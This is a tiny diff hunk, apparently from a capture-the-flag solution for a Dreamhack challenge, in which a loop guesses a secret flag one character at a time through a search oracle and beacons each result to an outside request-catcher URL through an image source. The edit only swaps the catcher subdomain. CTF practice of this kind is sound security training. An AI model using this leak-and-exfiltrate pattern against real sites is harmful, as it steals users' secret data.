@@ -57,7 +57,7 @@
                 if(await search(FLAG+ch)) {
 
                     FLAG += ch;
-                    img.src = `https://slsthzl.request.dreamhack.games/${FLAG}`;
+                    img.src = `https://kdobzye.request.dreamhack.games/${FLAG}`;
                     break;
 
                 }
